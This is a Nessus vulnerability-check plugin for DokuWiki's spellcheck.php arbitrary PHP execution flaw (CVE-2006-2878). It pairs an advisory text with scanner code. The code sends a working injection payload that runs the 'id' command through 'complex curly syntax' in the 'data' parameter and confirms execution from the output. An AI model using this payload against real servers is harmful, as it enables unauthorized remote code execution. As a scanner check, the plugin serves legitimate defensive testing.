#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP application that is affected by
an arbitrary code execution vulnerability. 

Description :

The remote host is running DokuWiki, an open-source wiki application
written in PHP. 

The installed version of DokuWiki fails to properly sanitize input to
the 'data' parameter of the 'lib/exe/spellcheck.php' script before
evaluating it to handle links embedded in the text.  An
unauthenticated attacker can leverage this issue with PHP commands in
'complex curly syntax' to execute arbitrary PHP code on the remote
host subject to the privileges of the web server user id. 

See also :

http://www.hardened-php.net/advisory_042006.119.html
http://www.securityfocus.com/archive/1/435989/30/0/threaded
http://bugs.splitbrain.org/index.php?do=details&id=823

Solution :

Upgrade to DokuWiki release 2006-03-09 with hotfix 823 or later. 

Risk factor : 

High / CVSS Base Score : 7 
(AV:R/AC:L/Au:NR/C:P/A:P/I:P/B:N)";


if (description)
{
  script_id(21662);
  script_version("$Revision: 1.2 $");

  script_cve_id("CVE-2006-2878");
  script_bugtraq_id(18289);

  script_name(english:"DokuWiki spellcheck Arbitrary Code Execution Vulnerability");
  script_summary(english:"Executes arbitrary PHP code via DocuWiki spellcheck");
 
  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = make_list("/doku", "/dokuwiki", "/wiki", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Make sure the script exists.
  url = string(dir, "/lib/exe/spellcheck.php");
  req = http_get(item:url, port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # If it does...
  if ("The called function does not exist!" >< res)
  {
    # Try to exploit the flaw to run a command.
    cmd = "id";
    postdata = string(
      "call=check&",
      "utf8=1&",
      "data=[[{${system(", cmd, ")}}]]"
    );
    req = string(
      "POST ", url, " HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      "User-Agent: ", get_kb_item("global_settings/http_user_agent"), "\r\n",
      "Content-Type: application/x-www-form-urlencoded\r\n",
      "Content-Length: ", strlen(postdata), "\r\n",
      "\r\n",
      postdata
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # There's a problem if...
    if (
      # the output looks like it's from id or...
      egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res) ||
      # PHP's disable_functions prevents running system().
      egrep(pattern:"Warning.+\(\) has been disabled for security reasons", string:res)
    )
    {
      if (egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res))
      {
        output = res - strstr(res, "0[[");
        report = string(
          desc,
          "\n\n",
          "Plugin output :\n",
          "\n",
          "Nessus was able to execute the command '", cmd, "' on the remote host,\n",
          "which produced the following output :\n",
          "\n",
          output
        );
      }
      else report = desc;

      security_hole(port:port, data:report);
      exit(0);
    }
  }
}
